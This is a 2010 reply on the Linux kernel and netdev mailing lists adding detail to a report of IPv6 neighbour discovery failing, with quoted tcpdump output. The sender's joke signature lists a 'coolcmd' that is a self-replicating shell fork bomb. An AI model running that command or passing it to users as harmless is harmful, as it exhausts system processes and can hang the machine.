From: Thomas Habets <thomas@habets.pp.se>
Subject: Re: BUG: IPv6 stops working after a while, needs ip ne del command
 to reset
Date: Tue, 17 Aug 2010 18:14:01 +0200 (CEST)
Message-ID: <alpine.DEB.1.10.1008171811590.21857@red.crap.retrofitta.se>
References: <alpine.DEB.1.10.1008131952470.19570@red.crap.retrofitta.se>  <1281953960.2524.23.camel@edumazet-laptop>  <alpine.DEB.1.10.1008161224510.13728@red.crap.retrofitta.se>  <alpine.DEB.1.10.1008170719180.21857@red.crap.retrofitta.se>
 <1282024802.2487.687.camel@edumazet-laptop>  <alpine.DEB.1.10.1008171053230.21857@red.crap.retrofitta.se> <1282050920.2448.47.camel@edumazet-laptop> <alpine.DEB.1.10.1008171547090.21857@red.crap.retrofitta.se>
Mime-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII; format=flowed
Cc: Eric Dumazet <eric.dumazet@gmail.com>,
	linux-kernel@vger.kernel.org, netdev <netdev@vger.kernel.org>
To: Thomas Habets <thomas@habets.pp.se>
Return-path: <linux-kernel-owner@vger.kernel.org>
In-Reply-To: <alpine.DEB.1.10.1008171547090.21857@red.crap.retrofitta.se>
Sender: linux-kernel-owner@vger.kernel.org
List-Id: netdev.vger.kernel.org

On Tue, 17 Aug 2010, Thomas Habets wrote:
> [ here i run "ip l set promisc on eth0" ]
[...]
> 2a00:800:752:1::5c:2 > 2a00:800:752:1::5c:1: ICMP6, echo request
> 2a00:800:752:1::5c:1 > 2a00:800:752:1::5c:2: ICMP6, echo reply

I should add that I turned promisc mode back off at about here. Otherwise 
the ND would work properly right after the "clear ipv6 neigbors" command.

> [ here I run "clear ipv6 neigbors" again ]
> 2a00:800:752:1::5c:2 > 2a00:800:752:1::5c:1: ICMP6, echo request
> 2a00:800:752:1::5c:2 > 2a00:800:752:1::5c:1: ICMP6, echo request

---------
typedef struct me_s {
   char name[]      = { "Thomas Habets" };
   char email[]     = { "thomas@habets.pp.se" };
   char kernel[]    = { "Linux" };
   char *pgpKey[]   = { "http://www.habets.pp.se/pubkey.txt" };
   char pgp[] = { "A8A3 D1DD 4AE0 8467 7FDE  0945 286A E90A AD48 E854" };
   char coolcmd[]   = { "echo '. ./_&. ./_'>_;. ./_" };
} me_t;
